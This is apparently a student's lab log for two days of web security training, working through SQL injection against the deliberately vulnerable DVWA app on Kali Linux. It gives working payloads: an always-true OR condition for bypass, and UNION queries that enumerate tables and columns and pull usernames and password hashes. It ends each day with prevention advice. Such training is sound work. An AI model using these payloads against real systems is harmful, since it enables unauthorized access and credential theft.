# Day 25 - Web Application Security (DVWA Setup + SQL Injection)

-- Initialized web application security lab and performed basic SQL Injection testing using DVWA  

Objective

-- Set up DVWA in Kali Linux  
-- Understand SQL Injection fundamentals  
-- Perform basic authentication bypass  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Apache Server  
-- MySQL Database  

Step 1 – Start Required Services

-- Start Apache:

   sudo service apache2 start  

-- Start MySQL:

   sudo service mysql start  

Step 2 – Access DVWA

-- Open browser:

   http://localhost/dvwa  

-- Login credentials:

   username: admin  
   password: password  

Step 3 – Configure DVWA

-- Navigate to:
   DVWA Security  

-- Set security level:
   LOW  

-- Click:
   Create / Reset Database  

Step 4 – SQL Injection (Normal Input)

-- Go to:
   SQL Injection module  

-- Input:

   1  

-- Observation:
   -- Displays user information for ID 1  

Step 5 – SQL Injection Attack

-- Input:

   1' OR '1'='1  

-- Observation:
   -- Application returns all user records  

Explanation

-- Original query:

   SELECT * FROM users WHERE id = '1';

-- Injected query:

   SELECT * FROM users WHERE id = '1' OR '1'='1';

-- Result:
   -- Condition always TRUE → all data returned  

Security Issue

-- Application does not validate user input  
-- Directly executes SQL queries  

Basic Prevention

-- Use:
   -- Prepared Statements  
   -- Input validation  
   -- Parameterized queries  

Key Concepts Learned

-- SQL Injection allows manipulation of database queries  
-- Can lead to:
   -- Data leakage  
   -- Authentication bypass  

# Day 26 - Advanced SQL Injection (Data Extraction & Authentication Bypass)

-- Performed advanced SQL Injection techniques to extract sensitive data and bypass authentication  

Objective

-- Extract usernames and passwords from database  
-- Perform authentication bypass  
-- Understand real-world SQL Injection impact  
-- Learn mitigation techniques  

Tools Used

-- Kali Linux  
-- DVWA (Damn Vulnerable Web App)  
-- Browser  

Setup

-- Ensure DVWA Security Level = LOW  

Step 1 – Identify Injection Point

-- Navigate to:
   SQL Injection module  

-- Test input:

   1  

-- Confirm application is vulnerable  

Step 2 – Authentication Bypass

-- Input:

   ' OR '1'='1  

-- Result:
   -- Bypasses login condition  

---

Step 3 – Extract Database Information

-- Use UNION-based SQL Injection:

   1' UNION SELECT null, database()-- -

-- Output:
   -- Displays current database name  

Step 4 – Extract Table Names

   1' UNION SELECT null, table_name FROM information_schema.tables-- -

-- Result:
   -- Lists tables (e.g., users)  

Step 5 – Extract Column Names

   1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users'-- -

-- Result:
   -- Shows columns (username, password)  

Step 6 – Extract User Credentials

   1' UNION SELECT user, password FROM users-- -

-- Result:
   -- Displays usernames and hashed passwords  

 Explanation

-- UNION operator combines results from multiple queries  
-- Enables attacker to retrieve hidden database data  

Security Impact

-- Full database exposure  
-- User credential leakage  
-- Unauthorized access  

Prevention Techniques

-- Use Prepared Statements  

Example (secure query):

   SELECT * FROM users WHERE id = ?  

-- Apply:
   -- Input validation  
   -- Parameterized queries  
   -- Least privilege access  

Key Concepts Learned

-- UNION-based SQL Injection  
-- Database enumeration  
-- Data extraction techniques  
